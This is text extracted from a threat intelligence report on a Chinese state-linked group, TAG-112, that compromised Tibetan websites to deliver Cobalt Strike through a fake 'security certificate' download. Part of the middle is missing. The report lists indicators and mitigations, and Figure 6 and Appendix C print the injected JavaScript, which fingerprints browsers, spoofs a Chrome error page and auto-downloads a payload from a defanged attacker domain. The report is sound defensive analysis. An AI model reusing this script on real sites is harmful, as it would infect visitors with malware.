Insikt Group identified six\nCobalt Strike Beacon samples linked to this activity. The infrastructure used for this campaign\nimplemented Cloudflare protection to obfuscate its origin. As of this writing, the websites remain\ncompromised and host the malicious JavaScript, and portions of the malicious infrastructure likely\nremain active.\nThis activity was conducted by a Chinese state-sponsored threat actor group we are calling TAG-112.\nThe group is particularly interested in targeting the Tibetan community and has several overlaps with\nTAG-102 (Evasive Panda).\nInsikt Group followed responsible disclosure procedures in advance of this publication per Recorded\nFuture's prenotification policy.\n\nKey Findings\n\u25cf\n\n\u25cf\n\n\u25cf\n\u25cf\n\n\u25cf\n\n1\n\nTAG-112 likely compromised the Tibet Post (tibetpost[.]net) and Gyudmed Tantric University\n(gyudmedtantricuniversity[.]org) websites on or around May 23, 2024. These websites remain\ncompromised as of this writing.\nThe compromised websites were manipulated to prompt visitors to the sites to download a\nmalicious executable disguised as a \u201csecurity certificate\u201d that ultimately loaded a Cobalt Strike\npayload upon execution.\nThe group likely exploited a vulnerability in the website's content management system, Joomla,\nto upload the malicious JavaScript.\nTAG-112 is likely a subgroup of TAG-102 (Evasive Panda), working toward the same or similar\nintelligence requirements, mainly focusing on targeting Tibetan entities. Despite these overlaps,\nInsikt Group is tracking this activity as a separate entity due to the difference in maturity\nbetween these campaigns.\nThe Tibetan community in exile, along with other religious and ethnic minority groups in China,\nhave long been targets for various Chinese cyber-espionage (advanced persistent threat; APT)\ngroups (1, 2, 3). Beijing perceives these groups as subversive or separatist elements challenging\nChinese Communist Party (CCP) rule, as well as avenues for foreign influence or interference in\nChina\u2019s internal affairs.\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nThreat Analysis\nMalicious JavaScript\nInsikt Group was recently made aware of a compromised website with close ties to the Tibetan\ncommunity. The compromise took place in late May 2024. The threat actors modified a JavaScript file\nto include a segment of malicious code (see Appendix C). This prompted website visitors to download\na malicious executable disguised as a \u201csecurity certificate\u201d that ultimately loaded a Cobalt Strike\nBeacon payload.\n\nFigure 1: Diagram of the observed infection chain (Source: Recorded Future)\n\nThe malicious JavaScript is triggered by the window.onload event. It first checks the user's operating\nsystem and web browser type; this is likely to filter out non-Windows operating systems, as this\nfunction will terminate the script if Windows isn\u2019t detected. The collected browser information is sent to\nthe TAG-112 domain update[.]maskrisks[.]com via a GET request with the browser type encapsulated in\na URL variable, ?type={Chrome or Edge}. This initial request returns a JSON object with a \u201cforbid\u201d\nboolean used to control the further execution and an HTML template spoof certificate error page that\nmatches the user's browser. If this initial request returns an error, the script exits and does not affect\nthe website.\nhttps[:]//update[.]maskrisks[.]com/?type=Chrome\nhttps[:]//update[.]maskrisks[.]com/?type=Edge\nFigure 2: URLs used in the initial GET request to return a spoofed HTML template (Source: Recorded Future)\n\n2\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nFigure 3: JSON object response from the request seen in Figure 2 (Source: urlscan)\n\nThe above HTML template is a modified copy of the Google Chrome TLS certificate error page\ndisplayed to users when there is an issue with the host's TLS certificate, as shown in Figure 4 below.\n\nFigure 4: Modified Chrome TLS certificate error page (Source: urlscan)\n\n3\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nThe script replaces three placeholder values in the HTML template:\n\u25cf\n\u25cf\n\u25cf\n\n<%-- domian --%>1\nReplaced with location.hostname variable (compromised website domain)\n<%-- downloadURL --%>\nReplaced with ${REQUEST_URL}download - https[:]//update[.]maskrisks[.]com/download\ndnspod[.]cn\nReplaced with google[.]com\n\nThe HTML template (see Figure 5) contains an X.509 certificate (SHA256:\nD0972247C500D2A45F412F9434287161DE395A35EF5B4931CBA12CF513B76962) for the domain\n*.dnspod[.]cn and also a Chinese language comment \u201c// \u5982\u679c\u9519\u8bef\u662f\u7531\u4e8e\u4e00\u4e2a\u5931\u8d25\u7684a href\u8bf7\u6c42\u5f15\u8d77\u7684\uff0c\u5219\n\u5173\u95ed\u7a97\u53e3\u201d, which translates to \u201cIf the error is caused by a failed a href request, close the window\u201d.\nThese artifacts indicate that the actor who modified this template is likely a Chinese speaker, given the\nuse of a Chinese DNS provider to generate the HTML page and the Chinese-language code comment.\nThis HTML template then overwrites the compromised website code. After a two-second delay, the\nscript triggers an alert with the message \u201cClick to download the security certificate\u201d and automatically\nclicks a link to the download URL appended to the document body, starting the download of the\nmalicious file, as shown in Figure 6.\n\n1\n\n\u201cdomian\u201d is misspelled in both the malicious JavaScript snippet and HTML template.\n\n4\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nFigure 5: X.509 certificate for dnspod[.]cn found in HTML template source code, SHA256:\nD0972247C500D2A45F412F9434287161DE395A35EF5B4931CBA12CF513B76962 (Source: Recorded Future)\n\nif (res.forbid) {\ndocument.open();\ndocument.write(replaceTemplate(res.html));\ndocument.close();\nsetTimeout(() => {\nalert(\"Click to download the security certificate.\");\nconst a = document.createElement('a');\na.href = `${REQUEST_URL}download`;\na.style.display = 'none';\ndocument.body.appendChild(a);\na.click();\ndocument.body.removeChild(a);\n},2000)\n}\nFigure 6: Snippet of malicious JavaScript that handles overwriting the compromised website with spoof HTML code and\ntriggers the fake security certificate alert (Source: Recorded Future)\n\n5\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nCompromised Tibetan Websites\nInsikt Group identified two additional Tibetan websites compromised with the same malicious\nJavaScript, Tibet Post (tibetpost[.]net) and Gyudmed Tantric University\n(gyudmedtantricuniversity[.]org). HTTP response headers suggest the websites were likely modified on\nMay 23, 2024, as shown in Figures 7 and 8. Tibetan news website tibetpost[.]net was previously\ncompromised by TAG-102 (Evasive Panda) to host malicious payloads, including backdoors for\nWindows and macOS.\nBoth websites are almost certainly built with the Joomla CMS (content management system). If not\nmaintained and updated, Joomla-based websites become an easy target for cyber threat actors.\nTAG-112 likely exploited a vulnerability in the websites to upload the malicious JavaScript.\n\n6\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nFigures 7 and 8: Response headers for modified JavaScript files on compromised Tibetan websites (Source: urlscan 1, 2)\n\nTAG-112 Infrastructure\nThe TAG-112 domain update[.]maskrisks[.]com, found in the malicious JavaScript, uses Cloudflare for\nits name servers, which abstracts the IP address of the threat actor\u2019s server. Using server banner data,\nInsikt Group identified three Kaopu Cloud-registered IP addresses in South Korea that served a\nCloudflare Origin certificate for *[.]maskrisks[.]com (SHA256:\n94569f64f62eff185ba47e991dba54bdeea6d1a9e205d6bec767be6a864e4efb):\n\u25cf\n\u25cf\n\u25cf\n\n154.90.62[.]12 \u2014 Active since at least August 7, 2024\n154.90.63[.]166 \u2014 Active since at least June 18, 2024\n154.205.138[.]202 \u2014 Active since at least March 19, 2024\n\nThe apex domain maskrisks[.]com was registered with Namecheap on March 18, 2024.

This same code-signing certificate was also used in the TAG-102 activity described by\nESET.\nIn the same campaign, TAG-102 compromised tibetpost[.]net as well to host malicious payloads. As\nidentified above, TAG-112 also compromised tibetpost[.]net; however, its campaign directly targeted\ntibetpost[.]net users. Other notable overlaps include using a fake error page to convince users to\ndownload a malicious \u201csecurity certificate\u201d file.\nDespite these overlaps, Insikt Group is tracking this activity as being conducted by a separate entity\ndue to the difference in maturity between these campaigns. The activity observed by TAG-112 lacks the\nsophistication seen by TAG-102. For example, TAG-112 does not use JavaScript obfuscation and\nemploys Cobalt Strike, while TAG-102 leverages custom malware. TAG-112 is likely a subgroup of\nTAG-102, working toward the same or similar intelligence requirements.\n\nMitigations\n\u25cf\n\n\u25cf\n\n\u25cf\n\u25cf\n\n10\n\nConfigure intrusion detection systems (IDS), intrusion prevention systems (IPS), or any\nnetwork defense mechanisms in place to alert on \u2014 and, upon review, consider blocking\nconnection attempts to and from \u2014 the indicators of compromise (IoCs) listed in Appendix A.\nTrain users to exercise extreme caution when handling files downloaded from untrusted\nsources, especially those that automatically download without user input. Ensure that users\nhave not configured their systems or applications to automatically execute or open files\ndownloaded from their browser.\nDetect and block malicious Cobalt Strike C2 servers in real-time via the Recorded Future\u00ae\nThreat Intelligence module.\nBy monitoring Malicious Traffic Analysis (MTA), Recorded Future clients can be alerted to likely\ncompromised hosts communicating with validated C2 infrastructure, including for Cobalt\nStrike.\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nOutlook\nThis TAG-112 campaign is emblematic of long-established intelligence requirements for Chinese\ncyber-espionage operators to gather information on the Tibetan community in exile and organizations\ninvolved in Tibetan human rights and/or independence movements. Other ethnic and religious minority\ngroups or affiliated organizations have for years been targeted by numerous Chinese APT groups (1, 2,\n3), as the CCP perceives these groups as subversive or separatist elements challenging its rule and as\navenues for foreign influence or interference into China\u2019s internal affairs.\nAs a result, it is highly likely that TAG-112 and TAG-102 (Evasive Panda), among a myriad of other\nChinese APT groups, will continue their targeting of ethnic, religious, and human rights-linked\norganizations that operate in or have a nexus to China.\n\n11\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nAppendix A \u2014 Indicators of Compromise\nCompromised Websites:\ntibetpost[.]net\ngyudmedtantricuniversity[.]org\nC2 Domains:\nmaskrisks[.]com\nmail[.]maskrisks[.]com\nupdate[.]maskrisks[.]com\ncheckupdate[.]maskrisks[.]com\nC2 IP Addresses:\n154.90.62[.]12\n154.90.63[.]166\n154.205.138[.]202\nCertificates:\nd0972247c500d2a45f412f9434287161de395a35ef5b4931cba12cf513b76962(*[.]dnspod[.]cn)\n94569f64f62eff185ba47e991dba54bdeea6d1a9e205d6bec767be6a864e4efb (Cloudflare Origin\n*.maskrisks[.]com)\nd4938cb5c031ec7f04d73d4e75f5db5c8a5c04ce (Stolen code-signing certificate KP MOBILE)\nURLs of malicious JavaScript:\nhttps[:]//gyudmedtantricuniversity[.]org/templates/lt_interiordesign/js/custom.js\nhttps[:]//tibetpost[.]net/templates/ja_teline_v/js/gallery/jquery.blueimp-gallery.full.js\nMalicious URLs:\nhttps[:]//update[.]maskrisks[.]com/download\nhttps[:]//update[.]maskrisks[.]com/?type=Chrome\nhttps[:]//update[.]maskrisks[.]com/?type=Edge\nhttp[:]//mail[.]maskrisks[.]com/api/view.php\nhttp[:]//154.205.138[.]202/GetUrl/cache\nhttps[:]//checkupdate[.]maskrisks[.]com/cache\nhttps[:]//update[.]maskrisks[.]com/cache\nCobalt Strike:\n1e42cbe23055e921eff46e5e6921ff1a20bb903fca83ea1f1294394c0df3f4cd\n0e306c0836a8ee035ae739c5adfbe42bd5021e615ebaa92f52d5d86fb895651d\nf1f11e52a60e5a446f1eb17bb718358def4825342acc0a41d09a051359a1eb3d\nf4ded3a67480a0e2a822af1e87a727243dea16ac1a3c0513aec62bff71f06b27\n966d311dcc598922e4ab9ce5524110a8bfd2c6b6db540d180829ceb7a7253831\n1e7cb19f77206317c8828f9c3cdee76f2f0ebf7451a625641f7d22bb8c61b21b\nLoaders:\n8d4049ef70c83a6ead26736c1330e2783bdc9708c497183317fad66b818e44cb\nE190c7e097a1c38dd45d9c149e737ad9253b1cabee1cee7ef080ddf52d1b378c (legitimate software)\n31f11b4d81f3ae25b6a01cd1038914f31d045bc4136c40a6221944ea553d6414\n\n12\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nAppendix B \u2014 MITRE ATT&CK Techniques\nTactic: Technique\n\nATT&CK Code\n\nResource Development: Acquire Infrastructure: Server\n\nT1583.004\n\nResource Development: Acquire Infrastructure: Web Services\n\nT1583.006\n\nResource Development: Compromise Infrastructure: Server\n\nT1584.004\n\nInitial Access: Drive-by Compromise\n\nT1189\n\nDefense Evasion: Hijack Execution Flow: DLL Side-Loading\n\nT1574.002\n\n13\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nAppendix C \u2014 Malicious JavaScript Snippet\nconst REQUEST_URL = \"https[:]//update[.]maskrisks[.]com/\";\nfunction getBrowserType() {\nvar ua = navigator.userAgent;\nif(ua.indexOf('Windows') === -1) return null;\nvar isEdge = ua.indexOf(\"Edg\") > -1;\nif (isEdge) { return 'Edge' };\nvar isChrome = (ua.indexOf(\"Chrome\") > -1) && (ua.indexOf(\"Safari\") > -1) &&\n(ua.indexOf(\"Edg\") == -1);\nif (isChrome) { return 'Chrome' };\nreturn 'Edge';\n}\nfunction replaceTemplate(html) {\nreturn html.replaceAll('<%-- downloadURL --%>',\n`${REQUEST_URL}download`).replaceAll('<%-- domian --%>',\nlocation.hostname).replaceAll('dnspod[.]cn',\"google\n[.]com\");;\n}\nwindow.onload = () => {\nconst browserType = getBrowserType();\nif(!browserType) return;\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', `${REQUEST_URL}?type=${browserType}`);\nxhr.send();\nxhr.onreadystatechange = function () {\nif (xhr.readyState === 4) {\nif (xhr.status >= 200 && xhr.status < 300) {\nconst res = JSON.parse(xhr.response);\nif (res.forbid) {\ndocument.open();\ndocument.write(replaceTemplate(res.html));\ndocument.close();\nsetTimeout(() => {\nalert(\"Click to download the security certificate.\");\nconst a = document.createElement('a');\na.href = `${REQUEST_URL}download`;\na.style.display = 'none';\ndocument.body.appendChild(a);\na.click();\ndocument.body.removeChild(a);\n},2000)\n}\n} else { }\n}\n}\n\n14\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nAppendix D \u2014 Diamond Model of Intrusion Analysis\n\n15\n\nCTA-CN-2024-1112\n\nRecorded Future\u00ae | www.recordedfuture.com\n\nCYBER THREAT ANALYSIS\n\nRecorded Future reporting contains expressions of likelihood or probability consistent\nwith US Intelligence Community Directive (ICD) 203: Analytic Standards (published\nJanuary 2, 2015).
